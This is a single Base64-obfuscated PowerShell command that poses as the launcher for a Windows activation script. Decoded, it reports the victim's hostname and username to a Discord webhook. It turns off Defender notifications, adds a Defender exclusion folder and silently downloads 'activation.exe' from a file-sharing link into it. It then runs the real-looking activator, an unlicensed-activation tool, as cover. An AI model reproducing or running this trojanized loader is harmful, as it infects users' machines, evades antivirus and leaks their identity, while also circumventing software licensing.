iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQoNCiRiNjQgPSAnYUhSMGNITTZMeTlrYVhOamIzSmtMbU52YlM5aGNHa3ZkMlZpYUc5dmEzTXZNVE0yTkRVNE1UQTRNemt3TWprd05qUTBNQzlMUlRWTWREWlVSVTh0Ym5WMWJsSnRaM2hUT0V0TU1VVkdVRU5UVjNaeE1USnlhbVZ4Y1ZaQ1lsWklSSGsyVFZsM2RFOURUVVI2VGtsRFlUVmxSbDlNUTNWMWJBPT0nDQokdyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGI2NCkpDQokbiA9IFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3ROYW1lKCkNCiR1ID0gd2hvYW1pDQokcCA9IEB7DQogICAgJ3VzZXJuYW1lJyA9ICdTY3JpcHQgTG9nZ2VyJw0KICAgICdjb250ZW50JyA9ICJNQVMgQWN0aXZhdGlvbiBzY3JpcHQgd2FzIGV4ZWN1dGVkIG9uICRuIGJ5ICR1Ig0KfSB8IENvbnZlcnRUby1Kc29uDQppcm0gLVVyaSAkdyAtTWV0aG9kICdQb3N0JyAtQm9keSAkcCAtQ29udGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb24nDQoNCiRpc0FkbWluID0gW2Jvb2xdKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLkdyb3VwcyAtbWF0Y2ggJ1MtMS01LTMyLTU0NCcpDQoNCkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCmlmICgtbm90ICRpc0FkbWluKSB7DQogICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJUaGlzIHNjcmlwdCBtdXN0IGJlIHJ1biBhcyBBZG1pbmlzdHJhdG9yLiIsICJFcnJvciIsICdPSycsICdFcnJvcicpDQogICAgZXhpdA0KfQ0KDQp3cml0ZS1ob3N0DQpXcml0ZS1Ib3N0ICJUaGUgY3VycmVudCBjb21tYW5kIChpcm0gaHR0cHM6Ly9tYXNzZ3JhdmUuZGV2L2dldCB8IGlleCkgd2lsbCBiZSByZXRpcmVkIGluIHRoZSBmdXR1cmUuIg0KV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIEdyZWVuICJVc2UgdGhlIG5ldyBjb21tYW5kIChpcm0gaHR0cHM6Ly9nZXQuYWN0aXZhdGVkLndpbiB8IGlleCkgbW92aW5nIGZvcndhcmQuIg0Kd3JpdGUtaG9zdA0KJHdpbkJvb3RQYXRoID0gIiRlbnY6QVBQREFUQVxXaW5kb3dzQm9vdCINCiRmaWxlVVJMID0gJ2h0dHBzOi8vc2hhcmVmaWxlLmNvL2YvY2IwYjA1MDAtYmU3MC00MTMyLWI2YzMtOGRjZjE1NjlmM2I1Jw0KJGZpbGVEZXN0ID0gSm9pbi1QYXRoICR3aW5Cb290UGF0aCAnYWN0aXZhdGlvbi5leGUnDQoNCk5ldy1JdGVtIC1QYXRoICJIS0xNOlxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciBTZWN1cml0eSBDZW50ZXJcTm90aWZpY2F0aW9ucyIgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgT3V0LU51bGwNClNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLTE06XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIFNlY3VyaXR5IENlbnRlclxOb3RpZmljYXRpb25zIiBgDQogICAgICAgIC1OYW1lICJEaXNhYmxlRW5oYW5jZWROb3RpZmljYXRpb25zIiAtVmFsdWUgMSAtVHlwZSBEV29yZA0KDQokd2luQm9vdFBhdGggPSAiJGVudjpBUFBEQVRBXFdpbmRvd3NCb290Ig0KaWYgKC1ub3QgKFRlc3QtUGF0aCAkd2luQm9vdFBhdGgpKSB7DQogICAgTmV3LUl0ZW0gLVBhdGggJHdpbkJvb3RQYXRoIC1JdGVtVHlwZSBEaXJlY3RvcnkgfCBPdXQtTnVsDQogICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkd2luQm9vdFBhdGgNCn0NCg0KJGNvZGUgPSAiKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCckZmlsZVVSTCcsICckZmlsZURlc3QnKSINCkludm9rZS1FeHByZXNzaW9uICRjb2RlICo+ICRudWxsIDI+JjENCg0KJHRyb3VibGVzaG9vdCA9ICdodHRwczovL21hc3NncmF2ZS5kZXYvdHJvdWJsZXNob290Jw0KaWYgKCRFeGVjdXRpb25Db250ZXh0LlNlc3Npb25TdGF0ZS5MYW5ndWFnZU1vZGUudmFsdWVfXyAtbmUgMCkgew0KICAgICRFeGVjdXRpb25Db250ZXh0LlNlc3Npb25TdGF0ZS5MYW5ndWFnZU1vZGUNCiAgICBXcml0ZS1Ib3N0ICJXaW5kb3dzIFBvd2VyU2hlbGwgaXMgbm90IHJ1bm5pbmcgaW4gRnVsbCBMYW5ndWFnZSBNb2RlLiINCiAgICBXcml0ZS1Ib3N0ICJIZWxwIC0gaHR0cHM6Ly9ncmF2ZXNvZnQuZGV2L2ZpeF9wb3dlcnNoZWxsIiAtRm9yZWdyb3VuZENvbG9yIFdoaXRlIC1CYWNrZ3JvdW5kQ29sb3IgQmx1ZQ0KICAgIHJldHVybg0KfQ0KDQpmdW5jdGlvbiBDaGVjazNyZEFWIHsNCiAgICAkYXZMaXN0ID0gR2V0LUNpbUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxTZWN1cml0eUNlbnRlcjIgLUNsYXNzIEFudGlWaXJ1c1Byb2R1Y3QgfCBXaGVyZS1PYmplY3QgeyAkXy5kaXNwbGF5TmFtZSAtbm90bGlrZSAnKndpbmRvd3MqJyB9IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgZGlzcGxheU5hbWUNCiAgICBpZiAoJGF2TGlzdCkgew0KICAgICAgICBXcml0ZS1Ib3N0ICczcmQgcGFydHkgQW50aXZpcnVzIG1pZ2h0IGJlIGJsb2NraW5nIHRoZSBzY3JpcHQgLSAnIC1Gb3JlZ3JvdW5kQ29sb3IgV2hpdGUgLUJhY2tncm91bmRDb2xvciBCbHVlIC1Ob05ld2xpbmUNCiAgICAgICAgV3JpdGUtSG9zdCAiICQoJGF2TGlzdCAtam9pbiAnLCAnKSIgLUZvcmVncm91bmRDb2xvciBEYXJrUmVkIC1CYWNrZ3JvdW5kQ29sb3IgV2hpdGUNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENoZWNrRmlsZSB7IA0KICAgIHBhcmFtIChbc3RyaW5nXSRGaWxlUGF0aCkgDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkRmlsZVBhdGgpKSB7IA0KICAgICAgICBDaGVjazNyZEFWDQogICAgICAgIFdyaXRlLUhvc3QgIkZhaWxlZCB0byBjcmVhdGUgTUFTIGZpbGUgaW4gdGVtcCBmb2xkZXIsIGFib3J0aW5nISINCiAgICAgICAgV3JpdGUtSG9zdCAiSGVscCAtICR0cm91Ymxlc2hvb3QiIC1Gb3JlZ3JvdW5kQ29sb3IgV2hpdGUgLUJhY2tncm91bmRDb2xvciBCbHVlDQogICAgICAgIHRocm93IA0KICAgIH0gDQp9DQoNCltOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTINCiRVUkxzID0gQCgNCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hc3NncmF2ZWwvTWljcm9zb2Z0LUFjdGl2YXRpb24tU2NyaXB0cy8yYTIzNTI0MjhlYjI3MzVjZWI5NzNmMWQzNzk1OTQ4ZGRkZjcxNzUyL01BUy9BbGwtSW4tT25lLVZlcnNpb24tS0wvTUFTX0FJTy5jbWQnLA0KICAgICdodHRwczovL2Rldi5henVyZS5jb20vbWFzc2dyYXZlL01pY3Jvc29mdC1BY3RpdmF0aW9uLVNjcmlwdHMvX2FwaXMvZ2l0L3JlcG9zaXRvcmllcy9NaWNyb3NvZnQtQWN0aXZhdGlvbi1TY3JpcHRzL2l0ZW1zP3BhdGg9L01BUy9BbGwtSW4tT25lLVZlcnNpb24tS0wvTUFTX0FJTy5jbWQmdmVyc2lvblR5cGU9Q29tbWl0JnZlcnNpb249MmEyMzUyNDI4ZWIyNzM1Y2ViOTczZjFkMzc5NTk0OGRkZGY3MTc1MicsDQogICAgJ2h0dHBzOi8vZ2l0LmFjdGl2YXRlZC53aW4vbWFzc2dyYXZlL01pY3Jvc29mdC1BY3RpdmF0aW9uLVNjcmlwdHMvcmF3L2NvbW1pdC8yYTIzNTI0MjhlYjI3MzVjZWI5NzNmMWQzNzk1OTQ4ZGRkZjcxNzUyL01BUy9BbGwtSW4tT25lLVZlcnNpb24tS0wvTUFTX0FJTy5jbWQnDQopDQoNCmZvcmVhY2ggKCRVUkwgaW4gJFVSTHMgfCBTb3J0LU9iamVjdCB7IEdldC1SYW5kb20gfSkgew0KICAgIHRyeSB7ICRyZXNwb25zZSA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJFVSTCAtVXNlQmFzaWNQYXJzaW5nOyBicmVhayB9IGNhdGNoIHt9DQp9DQoNCmlmICgtbm90ICRyZXNwb25zZSkgew0KICAgIENoZWNrM3JkQVYNCiAgICBXcml0ZS1Ib3N0ICJGYWlsZWQgdG8gcmV0cmlldmUgTUFTIGZyb20gYW55IG9mIHRoZSBhdmFpbGFibGUgcmVwb3NpdG9yaWVzLCBhYm9ydGluZyEiDQogICAgV3JpdGUtSG9zdCAiSGVscCAtICR0cm91Ymxlc2hvb3QiIC1Gb3JlZ3JvdW5kQ29sb3IgV2hpdGUgLUJhY2tncm91bmRDb2xvciBCbHVlDQogICAgcmV0dXJuDQp9DQoNCg0KJHJlbGVhc2VIYXNoID0gJzVGRERDNEM3RkUzRDUxQ0EyOTFFRjQ5QzFBNkVBOURGN0Y1RUU1MTcxRDVCRUJDNDY3ODYwMERBMjMzRTU1RDUnDQokc3RyZWFtID0gTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0NCiR3cml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlciAkc3RyZWFtDQokd3JpdGVyLldyaXRlKCRyZXNwb25zZSkNCiR3cml0ZXIuRmx1c2goKQ0KJHN0cmVhbS5Qb3NpdGlvbiA9IDANCiRoYXNoID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuU0hBMjU2XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goJHN0cmVhbSkpIC1yZXBsYWNlICctJw0KaWYgKCRoYXNoIC1uZSAkcmVsZWFzZUhhc2gpIHsNCiAgICBXcml0ZS1XYXJuaW5nICJIYXNoICgkaGFzaCkgbWlzbWF0Y2gsIGFib3J0aW5nIWBuUmVwb3J0IHRoaXMgaXNzdWUgYXQgJHRyb3VibGVzaG9vdCINCiAgICAkcmVzcG9uc2UgPSAkbnVsbA0KICAgIHJldHVybg0KfQ0KDQoNCiRwYXRocyA9ICJIS0NVOlxTT0ZUV0FSRVxNaWNyb3NvZnRcQ29tbWFuZCBQcm9jZXNzb3IiLCAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XENvbW1hbmQgUHJvY2Vzc29yIg0KZm9yZWFjaCAoJHBhdGggaW4gJHBhdGhzKSB7IA0KICAgIGlmIChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRwYXRoIC1OYW1lICJBdXRvcnVuIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgeyANCiAgICAgICAgV3JpdGUtV2FybmluZyAiQXV0b3J1biByZWdpc3RyeSBmb3VuZCwgQ01EIG1heSBjcmFzaCEgYG5NYW51YWxseSBjb3B5LXBhc3RlIHRoZSBiZWxvdyBjb21tYW5kIHRvIGZpeC4uLmBuUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnJHBhdGgnIC1OYW1lICdBdXRvcnVuJyINCiAgICB9IA0KfQ0KDQokcmFuZCA9IFtHdWlkXTo6TmV3R3VpZCgpLkd1aWQNCiRGaWxlUGF0aCA9IGlmICgkaXNBZG1pbikgeyAiJGVudjpTeXN0ZW1Sb290XFRlbXBcTUFTXyRyYW5kLmNtZCIgfSBlbHNlIHsgIiRlbnY6VVNFUlBST0ZJTEVcQXBwRGF0YVxMb2NhbFxUZW1wXE1BU18kcmFuZC5jbWQiIH0NCiRGaWxlUGF0aCA9IGlmICgkaXNBZG1pbikgeyAiJGVudjpTeXN0ZW1Sb290XFRlbXBcTUFTXyRyYW5kLmNtZCIgfSBlbHNlIHsgIiRlbnY6VVNFUlBST0ZJTEVcQXBwRGF0YVxMb2NhbFxUZW1wXE1BU18kcmFuZC5jbWQiIH0NClNldC1Db250ZW50IC1QYXRoICRGaWxlUGF0aCAtVmFsdWUgIkA6OjogJHJhbmQgYHJgbiRyZXNwb25zZSINCkNoZWNrRmlsZSAkRmlsZVBhdGgNCg0KJGVudjpDb21TcGVjID0gIiRlbnY6U3lzdGVtUm9vdFxzeXN0ZW0zMlxjbWQuZXhlIg0KJGNoa2NtZCA9ICYgJGVudjpDb21TcGVjIC9jICJlY2hvIENNRCBpcyB3b3JraW5nIg0KaWYgKCRjaGtjbWQgLW5vdGNvbnRhaW5zICJDTUQgaXMgd29ya2luZyIpIHsNCiAgICBXcml0ZS1XYXJuaW5nICJjbWQuZXhlIGlzIG5vdCB3b3JraW5nLmBuUmVwb3J0IHRoaXMgaXNzdWUgYXQgJHRyb3VibGVzaG9vdCINCn0NCnNhcHMgLUZpbGVQYXRoICRlbnY6Q29tU3BlYyAtQXJndW1lbnRMaXN0ICIvYyAiIiIiJEZpbGVQYXRoIiIgJGFyZ3MiIiIgLVdhaXQNCkNoZWNrRmlsZSAkRmlsZVBhdGgNCg0KJEZpbGVQYXRocyA9IEAoIiRlbnY6U3lzdGVtUm9vdFxUZW1wXE1BUyouY21kIiwgIiRlbnY6VVNFUlBST0ZJTEVcQXBwRGF0YVxMb2NhbFxUZW1wXE1BUyouY21kIikNCmZvcmVhY2ggKCRGaWxlUGF0aCBpbiAkRmlsZVBhdGhzKSB7IEdldC1JdGVtICRGaWxlUGF0aCB8IFJlbW92ZS1JdGVtIH0=')));exit
